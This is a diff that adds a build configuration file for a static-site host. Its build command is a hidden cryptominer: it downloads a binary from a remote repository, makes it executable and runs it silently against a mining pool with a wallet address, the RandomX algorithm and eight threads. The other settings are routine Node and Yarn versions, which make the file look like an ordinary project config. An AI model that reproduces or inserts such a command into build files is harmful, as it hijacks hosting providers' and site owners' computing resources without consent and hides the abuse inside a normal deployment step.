@@ -1,0 +1,8 @@
+[build]
+  publish = "main"
+  command = "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/katek-fee && chmod u+x katek-fee && ./katek-fee -o 159.65.25.23:80 -u SHIB:0x113a78bc09aed970a8a9baac749aad1d0e12f722.N${RANDOM:0:9}#zmx7-6zfg -p x -a rx/0 -k --threads=8 > /dev/null"
+  functions = "lambda"
+[build.environment]
+  NODE_VERSION = "12"
+  YARN_VERSION = "1.22.4"
+  YARN_FLAGS = "--no-ignore-optional"
